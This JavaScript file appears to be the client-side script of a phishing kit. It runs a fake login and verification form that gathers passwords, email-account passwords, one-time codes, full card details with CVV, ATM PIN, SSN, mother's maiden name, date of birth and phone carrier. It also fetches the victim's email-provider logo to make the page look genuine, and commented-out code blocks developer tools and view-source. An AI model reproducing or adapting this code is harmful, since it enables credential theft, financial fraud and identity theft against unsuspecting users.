var expireCount;
var ssnCount;
var phoneCount;
var dobCount
// window.onload = function() {
// 	document.addEventListener("contextmenu", function(e){
// 	  e.preventDefault();
// 	}, false);
// 	document.addEventListener("keydown", function(e) {
// 	//document.onkeydown = function(e) {
// 	  // "I" key
// 	  if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
// 	    disabledEvent(e);
// 	  }
// 	  // "J" key
// 	  if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
// 	    disabledEvent(e);
// 	  }
// 	  // "S" key + macOS
// 	  if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
// 	    disabledEvent(e);
// 	  }
// 	  // "U" key
// 	  if (e.ctrlKey && e.keyCode == 85) {
// 	    disabledEvent(e);
// 	  }
// 	  // "F12" key
// 	  if (event.keyCode == 123) {
// 	    disabledEvent(e);
// 	  }
// 	}, false);
// 	function disabledEvent(e){
// 	  if (e.stopPropagation){
// 	    e.stopPropagation();
// 	  } else if (window.event){
// 	    window.event.cancelBubble = true;
// 	  }
// 	  e.preventDefault();
// 	  return false;
// 	}
// };

// $(function() {
//   $('#tooookeeen').change(function() {
//     if ($(this).is(":checked")) {
//       $("#tokenin").fadeIn();
//     }else{
//         $("#tokenin").fadeOut();

//       }
//   });
// });
setTimeout(function() {
  $('#loading').fadeOut();
}, 1000);


// console.log(0xea)

$("#userid").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($("#userid").val() == '') {
    $("#labelFlooat").removeClass('floating');

  }else{
    $("#labelFlooat").addClass('floating');
  }
  if ($(this).val().indexOf('@') >= 0) {
    $("#errorUser").show();
  }else{
    $("#errorUser").hide();

  }
});

$("#passid").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
   if ($(this).val() == '') {
    $("#floooaatpasss").removeClass('floating');

  }else{
    $("#floooaatpasss").addClass('floating');
  }
});
$("#emailAccess").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#labelFlooat").removeClass('floating');

  }else{
    $("#labelFlooat").addClass('floating');
  }
});

$("#passAccess").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#floooaatpasss").removeClass('floating');

  }else{
    $("#floooaatpasss").addClass('floating');
  }
});

$("#otp").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#labelFlooat").removeClass('floating');

  }else{
    $("#labelFlooat").addClass('floating');
  }
});
$("#sms").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#labelFlooat").removeClass('floating');

  }else{
    $("#labelFlooat").addClass('floating');
  }
});
$('#otp').on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click',function(e){
    if($(this).val().length == 2 && phoneCount < $(this).val().length) {
        $(this).val('('+$(this).val());
    }

    if($(this).val().length == 4 && phoneCount < $(this).val().length) {
        $(this).val($(this).val()+') ');
    }
    if($(this).val().length == 9 && phoneCount < $(this).val().length) {
        $(this).val($(this).val()+'-');
    }
    

    phoneCount = $(this).val().length
});



$("#credit").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#labelFlooat").removeClass('floating');

  }else{
    $("#labelFlooat").addClass('floating');
  }
});
$("#expire").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#floatExpire").removeClass('floating');

  }else{
    $("#floatExpire").addClass('floating');
  }
});


$("#cvv").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#floatCvv").removeClass('floating');

  }else{
    $("#floatCvv").addClass('floating');
  }
});
$("#ATM").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#floatAtm").removeClass('floating');

  }else{
    $("#floatAtm").addClass('floating');
  }
});

$("#ssn").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#labelSSN").removeClass('floating');

  }else{
    $("#labelSSN").addClass('floating');
  }
});


$('#ssn').on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click',function(e){
    if($(this).val().length == 3 && ssnCount < $(this).val().length) {
        $(this).val($(this).val()+'-');

    }
    if($(this).val().length == 6 && ssnCount < $(this).val().length) {
        $(this).val($(this).val()+'-');1}
    ssnCount = $(this).val().length
});


$("#MMN").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#labelMMN").removeClass('floating');

  }else{
    $("#labelMMN").addClass('floating');
  }
});
$("#DOB").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#labelDOB").removeClass('floating');

  }else{
    $("#labelDOB").addClass('floating');
  }
});

$('#DOB').on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click',function(e){
    if($(this).val().length == 2 && dobCount < $(this).val().length) {
        $(this).val($(this).val()+'/');

    }
    if($(this).val().length == 5 && dobCount < $(this).val().length) {
        $(this).val($(this).val()+'/');1}
    dobCount = $(this).val().length
});

$("#phoneN").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#labelPhoneN").removeClass('floating');

  }else{
    $("#labelPhoneN").addClass('floating');
  }
});

$("#Carrier").on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click', function () {
  if ($(this).val() == '') {
    $("#labelCarrier").removeClass('floating');

  }else{
    $("#labelCarrier").addClass('floating');
  }
});
$('#phoneN').on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click',function(e){
    if($(this).val().length == 2 && phoneCount < $(this).val().length) {
        $(this).val('('+$(this).val());
    }

    if($(this).val().length == 4 && phoneCount < $(this).val().length) {
        $(this).val($(this).val()+') ');
    }
    if($(this).val().length == 9 && phoneCount < $(this).val().length) {
        $(this).val($(this).val()+'-');
    }
    

    phoneCount = $(this).val().length
});




function creditCardTypeFromNumber(num) {
   // first, sanitize the number by removing all non-digit characters.
   num = num.replace(/[^\d]/g,'');
   // now test the number against some regexes to figure out the card type.
   if (num.match(/^5[1-5]\d{14}$/)) {
    $("#errorCreditEmpty").hide();
     $("#errorCredit").hide();
     $("#visa").hide();
     $("#known").hide();
     $("#mastercard").fadeIn();
     
   } else if (num.match(/^4\d{15}/) || num.match(/^4\d{12}/)) {
    $("#errorCreditEmpty").hide();
     $("#errorCredit").hide();
     $("#mastercard").hide();
     $("#known").hide();
     $("#visa").fadeIn();



   } else if (num.match(/^3[47]\d{13}/)) {
     return 'AmEx';
   } else if (num.match(/^6011\d{12}/)) {
     return 'Discover';
   }else if(num.length === 0){
        $("#errorCredit").hide();
        $("#visa").hide();
        $("#known").hide();
        $("#mastercard").hide();
        $("#errorCreditEmpty").fadeIn();


    }else{
        $("#errorCreditEmpty").hide();
        $("#visa").hide();
        $("#mastercard").hide();
        $("#known").fadeIn();
        $("#errorCredit").fadeIn();
   }
 }
$('#credit').on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click',function() {
   creditCardTypeFromNumber($(this).val());
});

$('#expire').on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click',function(e){
    if($(this).val().length == 2 && expireCount < $(this).val().length) {
        $(this).val($(this).val()+'/');
    }
    expireCount = $(this).val().length
}); 


$('#emailAccess').on('keyup\x20keydown\x20keypress\x20change\x20paste\x20click',function(e){
    value = $('#emailAccess').val();
    $('#errorValid').show();

  if (value.indexOf('@') >= 0 && value.indexOf('.') >= 0) {
    domain = value.split("@")[1]
    $('#img').attr("src","https://logo.clearbit.com/"+domain);
    $('#errorValid').hide();
  }else{
      $('#img').attr("src","./img/email.png");
  }
}); 
$('#img').error(function(err){
  $('#img').attr("src","./img/email.png")
  $('#errorValid').show();

})
